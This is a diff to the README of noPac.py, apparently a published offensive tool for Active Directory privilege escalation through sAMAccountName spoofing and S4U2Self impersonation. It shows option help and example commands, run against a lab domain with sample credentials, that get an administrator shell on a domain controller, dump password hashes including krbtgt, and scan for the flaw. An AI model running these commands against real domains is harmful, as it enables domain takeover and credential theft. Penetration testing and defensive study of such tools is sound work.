@@ -19,7 +19,6 @@ optional arguments:
                         target username that will be impersonated (thru S4U2Self) for quering the ST. Keep in mind this will only work if the identity provided in this scripts is allowed for delegation to the SPN specified
   -domain-netbios NETBIOSNAME
                         Domain NetBIOS name. Required if the DC has multiple domains.
-  -host-name HOSTNAME   Target Host name. Required if the domain has multiple domain controllers.
   -new-name NEWNAME     Add new computer name, if not specified, will be random generated.
   -debug                Turn DEBUG output ON
   -ts                   Adds timestamp to every logging output
@@ -37,7 +36,7 @@ authentication:
   -dc-host hostname     Hostname of the domain controller to use. If ommited, the domain part (FQDN) specified in the account parameter will be used
   -dc-ip ip             IP of the domain controller to use. Useful if you can't translate the FQDN.specified in the account parameter will be used
 
-execute:
+execute options:
   -port [destination port]
                         Destination port to connect to SMB Server
   -share SHARE          share where the output will be grabbed from (default ADMIN$)
@@ -72,13 +71,20 @@ python noPac.py cgdomain.com/sanfeng:'1qaz@WSX' -dc-ip 10.211.55.203
 
 ### Auto get shell
 ```
-python noPac.py cgdomain.com/sanfeng:'1qaz@WSX' -dc-ip 10.211.55.203 -shell --impersonate administrator -host-name lab2012
+python noPac.py cgdomain.com/sanfeng:'1qaz@WSX' -dc-ip 10.211.55.203 -dc-host lab2012 -shell --impersonate administrator 
 ```
 
-![](https://blogpics-1251691280.file.myqcloud.com/imgs/202112131823519.png)
+![](https://blogpics-1251691280.file.myqcloud.com/imgs/202112132025207.png)
 ### Dump hash
 ```
-python noPac.py cgdomain.com/sanfeng:'1qaz@WSX' -dc-ip 10.211.55.203 --impersonate administrator -host-name lab2012 -dump
-python noPac.py cgdomain.com/sanfeng:'1qaz@WSX' -dc-ip 10.211.55.203 --impersonate administrator -host-name lab2012 -dump -just-dc-user cgdomain/krbtgt
+python noPac.py cgdomain.com/sanfeng:'1qaz@WSX' -dc-ip 10.211.55.203 -dc-host lab2012 --impersonate administrator -dump
+python noPac.py cgdomain.com/sanfeng:'1qaz@WSX' -dc-ip 10.211.55.203 -dc-host lab2012 --impersonate administrator -dump -just-dc-user cgdomain/krbtgt
 ```
-![](https://blogpics-1251691280.file.myqcloud.com/imgs/202112131826640.png)
+![](https://blogpics-1251691280.file.myqcloud.com/imgs/202112132025423.png)
+
+
+## Scanner
+```
+python scanner.py cgdomain.com/sanfeng:'1qaz@WSX' -dc-ip 10.211.55.203
+```
+![](https://blogpics-1251691280.file.myqcloud.com/imgs/202112132151180.png)
